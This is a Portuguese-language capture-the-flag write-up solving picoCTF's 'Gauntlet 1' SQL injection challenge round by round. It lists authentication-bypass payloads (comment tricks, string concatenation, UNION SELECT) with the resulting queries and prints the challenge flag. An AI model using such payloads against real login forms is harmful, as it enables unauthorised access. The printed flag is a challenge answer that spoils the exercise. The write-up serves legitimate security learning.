# Gauntlet 1 
###### Resolvido por @Menegaldo e @BrunoCuba
> Este é um CTF sobre [SQL Injection]  

## Sobre o Desafio  
Can you beat the filters? 

**Objetivo:** Log in as admin.  

## 🔗 Links do Desafio
- [Gauntlet_1](https://play.picoctf.org/practice/challenge/88)
- [Acesse o desafio](http://jupiter.challenges.picoctf.org:19593/)  
- [Página de filtragem](http://jupiter.challenges.picoctf.org:19593/filter.php)  

Boa sorte! 🔥  


## Solução

Ao acessar o site, somos apresentados a uma tela de login onde precisamos fornecer um nome de usuário e senha. O principal desafio aqui é descobrir como "burlar" a filtragem SQL para conseguir logar como o usuário "admin".

![image](https://github.com/user-attachments/assets/bbfac422-eb64-4cb1-8829-41d31270dd6b)

#### Análise Inicial:

Na página de login, ao tentar submeter credenciais genéricas, observamos que o sistema faz uma consulta SQL com base nas entradas fornecidas. O que nos chamou atenção foi que a consulta estava vulnerável a um SQL Injection. Aqui, começamos a explorar como explorar esse tipo de falha.

![image](https://github.com/user-attachments/assets/75983be8-7be6-46fd-a23d-bb24e4897f6c)

Round 1:
No primeiro round, a consulta SQL aceita o uso de comentários para ignorar a parte da senha. Isso foi feito utilizando o símbolo --, que serve para comentar tudo após ele na consulta.

Entrada:
```
Usuário: admin' --
Senha: qualquercoisa
```
```
SELECT * FROM users WHERE username = 'admin' --' AND password = 'qualquercoisa'
```

![image](https://github.com/user-attachments/assets/cfa0cf35-6072-4005-8687-220fffe93a8e)

Neste caso, a parte da senha foi ignorada devido ao comentário, permitindo o login com o usuário "admin".

Round 2:
No segundo round, foi possível observar que mais palavras-chave estavam permitidas na consulta SQL, como /*, outro tipo de comentário. A ideia era testar se podíamos usar esses novos filtros para burlar a autenticação.

Entrada:
```
Usuário: admin' /*
Senha: qualquercoisa
```
```
SELECT * FROM users WHERE username='admin' /*' AND password='1'
```
O filtro continuou permitindo que a parte da senha fosse ignorada e o login fosse feito com sucesso.

Round 3:
No terceiro round, a consulta aceitou o uso de ;, que finaliza uma consulta SQL e pode ser usada para iniciar uma nova execução. Testamos esse comportamento para tentar criar uma segunda consulta, mas isso não teve efeito imediato no resultado da aplicação.

Entrada:
```
Usuário: admin';
Senha: qualquercoisa
```
```
SELECT * FROM users WHERE username='admin';' AND password='123'
```
O uso do ; separou as duas partes da consulta, mas a aplicação não alterou a execução.

Round 4:
Nesse round, testamos um método diferente de injeção, tentando usar a concatenação para formar o nome de usuário "admin". Isso foi feito com a utilização de ||, que permite a junção de strings em consultas SQL.

Entrada:
```
Usuário: ad'||'min';
Senha: qualquercoisa
```
```
SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
```
A aplicação aceitou a injeção e conseguimos passar para o próximo round.

Round 5:
Finalmente, no último round, conseguimos usar o comando union para injetar nossa própria consulta SQL e visualizar a flag.

Entrada:
```
Usuário: admin' UNION SELECT 1,2,3,4--
Senha: qualquercoisa
```
```
SELECT * FROM users WHERE username='admin' UNION SELECT 1,2,3,4--'
```
Com isso, conseguimos obter a instrução para acessar o filter.php.

> Assim, obtemos a flag `picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}`  
